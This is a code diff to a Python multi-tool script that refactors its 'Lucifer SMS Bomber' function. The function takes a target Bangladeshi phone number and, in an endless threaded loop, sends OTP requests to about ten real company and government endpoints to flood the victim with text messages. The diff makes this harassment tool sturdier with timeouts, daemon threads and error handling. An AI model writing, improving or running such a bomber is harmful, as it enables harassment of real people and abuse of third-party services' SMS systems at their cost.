@@ -250,125 +250,154 @@ def mac_gen():
     mac_addr = ':'.join(f"{x:02x}" for x in mac)
     print(GREEN + f"\nRandom MAC: {mac_addr}\n" + RESET)
 
+
 # ----------------------------- #
 # 23. Lucifer SMS Bomber
 # ----------------------------- #
 def Lucifer_Bomber():
-    import os
-    import time
-    import threading
-    import requests
-    RED = "\033[1;31m"
-    GREEN = "\033[1;32m"
-    RESET = "\033[0m"
+    try:
+        import os
+        import time
+        import threading
+        import requests
 
-    PASSWORD = "Lucifer@143"
+        RED = "\033[1;31m"
+        GREEN = "\033[1;32m"
+        RESET = "\033[0m"
 
-    def banner():
-        os.system("cls" if os.name == "nt" else "clear")
-        print(f"""{RED}
-    ██╗     ██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ 
-    ██║     ██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗
-    ██║     ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝
-    ██║     ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗
-    ███████╗╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║
-    ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
-    {RESET}{GREEN}
-             LUCIFER BD SMS BOMBER v2.0
-               Developed by Foysal...
-    {RESET}""")
+        PASSWORD = "Lucifer@143"
 
-    def password_prompt():
-        print("\033[1;31m[!] This tool is password protected.\033[0m")
-        pw = input("Enter password: ")
-        if pw != PASSWORD:
-            print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
-            exit()
-        print("\033[1;32m[+] Access Granted!\033[0m")
-        time.sleep(1)
+        def banner():
+            os.system("cls" if os.name == "nt" else "clear")
+            print(f"""{RED}
+        ██╗     ██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ 
+        ██║     ██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗
+        ██║     ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝
+        ██║     ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗
+        ███████╗╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║
+        ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
+        {RESET}{GREEN}
+                 LUCIFER BD SMS BOMBER v2.0
+                   Developed by Foysal...
+        {RESET}""")
 
-    def menu():
-        banner()
-        print("\n\033[1;36m[1] Start SMS Bombing\n[2] Exit\033[0m")
-        choice = input("Select an option: ")
-        if choice == "1":
-            start_bombing()
-        else:
-            print("\033[1;31m[-] Exiting...\033[0m")
-            exit()
+        def password_prompt():
+            print("\033[1;31m[!] This tool is password protected.\033[0m")
+            pw = input("Enter password: ")
+            if pw != PASSWORD:
+                print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
+                return False
+            print("\033[1;32m[+] Access Granted!\033[0m")
+            time.sleep(1)
+            return True
 
-    def get_target():
-        number = input("Enter target number (01XXXXXXXXX): ")
-        if number.startswith("01") and len(number) == 11:
-            return number, "880" + number[1:]
-        else:
-            print("Invalid number format.")
-            exit()
+        def bomber_menu():
+            print("\n\033[1;36m[1] Start SMS Bombing\n[2] Exit\033[0m")
+            choice = input("Select an option: ")
+            return choice
 
-    counter = 0
-    lock = threading.Lock()
+        def get_target():
+            number = input("Enter target number (01XXXXXXXXX): ")
+            if number.startswith("01") and len(number) == 11:
+                return number, "880" + number[1:]
+            else:
+                print("Invalid number format.")
+                return None, None
 
-    def update_counter():
-        global counter
-        with lock:
-            counter += 1
-            print(f"\033[1;32m[+] SMS Sent: {counter}\033[0m")
+        counter = 0
+        lock = threading.Lock()
 
-    def fast_apis(phone, full):
-        try:
-            requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0")
-            update_counter()
-        except:
-            pass
+        def update_counter():
+            global counter
+            with lock:
+                counter += 1
+                print(f"\033[1;32m[+] SMS Sent: {counter}\033[0m")
 
-        try:
-            requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}")
-            update_counter()
-        except:
-            pass
-
-    def normal_apis(phone, full):
-        apis = [
-            ("https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": full}),
-            ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
-             {"phone": phone}),
-            ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": phone}),
-            ("https://api.apex4u.com/api/auth/login", {"phone": phone}),
-            ("https://bb-api.bohubrihi.com/public/activity/otp", {"phone": phone}),
-            ("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {"mobile": phone}),
-            ("https://training.gov.bd/backoffice/api/user/sendOtp", {"phone": phone}),
-            ("https://da-api.robi.com.bd/da-nll/otp/send", {"msisdn": full}),
-        ]
-
-        for url, data in apis:
+        def fast_apis(phone, full):
             try:
-                requests.post(url, json=data)
+                requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0",
+                             timeout=5)
                 update_counter()
             except:
                 pass
 
-    def start_bombing():
-        phone, full = get_target()
-        while True:
-            threads = []
+            try:
+                requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}", timeout=5)
+                update_counter()
+            except:
+                pass
 
-            for _ in range(3):
-                t = threading.Thread(target=fast_apis, args=(phone, full))
-                t.start()
-                threads.append(t)
+        def normal_apis(phone, full):
+            apis = [
+                ("https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": full}),
+                ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
+                 {"phone": phone}),
+                ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": phone}),
+                ("https://api.apex4u.com/api/auth/login", {"phone": phone}),
+                ("https://bb-api.bohubrihi.com/public/activity/otp", {"phone": phone}),
+                ("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {"mobile": phone}),
+                ("https://training.gov.bd/backoffice/api/user/sendOtp", {"phone": phone}),
+                ("https://da-api.robi.com.bd/da-nll/otp/send", {"msisdn": full}),
+            ]
 
-            t = threading.Thread(target=normal_apis, args=(phone, full))
-            t.start()
-            threads.append(t)
+            for url, data in apis:
+                try:
+                    requests.post(url, json=data, timeout=5)
+                    update_counter()
+                except:
+                    pass
 
-            for t in threads:
-                t.join()
-            time.sleep(1)
+        def start_bombing():
+            phone, full = get_target()
+            if phone is None:
+                return
 
-    if __name__ == "__main__":
+            print(f"\n{GREEN}[+] Starting SMS Bombing on {phone}{RESET}")
+            print(f"{YELLOW}[!] Press Ctrl+C to stop{RESET}\n")
+
+            try:
+                while True:
+                    threads = []
+
+                    for _ in range(3):
+                        t = threading.Thread(target=fast_apis, args=(phone, full))
+                        t.daemon = True
+                        t.start()
+                        threads.append(t)
+
+                    t = threading.Thread(target=normal_apis, args=(phone, full))
+                    t.daemon = True
+                    t.start()
+                    threads.append(t)
+
+                    for t in threads:
+                        t.join(timeout=10)
+                    time.sleep(1)
+
+            except KeyboardInterrupt:
+                print(f"\n{RED}[!] SMS Bombing stopped by user.{RESET}")
+                print(f"{GREEN}[+] Total SMS sent: {counter}{RESET}")
+
+        # Main bomber execution
         banner()
-        password_prompt()
-        menu()
+        if not password_prompt():
+            return
+
+        while True:
+            choice = bomber_menu()
+            if choice == "1":
+                start_bombing()
+                break
+            elif choice == "2":
+                print(f"{RED}[+] Returning to main menu...{RESET}")
+                break
+            else:
+                print(f"{RED}[-] Invalid option!{RESET}")
+
+    except Exception as e:
+        print(f"{RED}\nBomber Failed: {str(e)}{RESET}")
+        print(f"{YELLOW}Returning to main menu...{RESET}")
+
 
 # ----------------------------- #
 # Main Menu
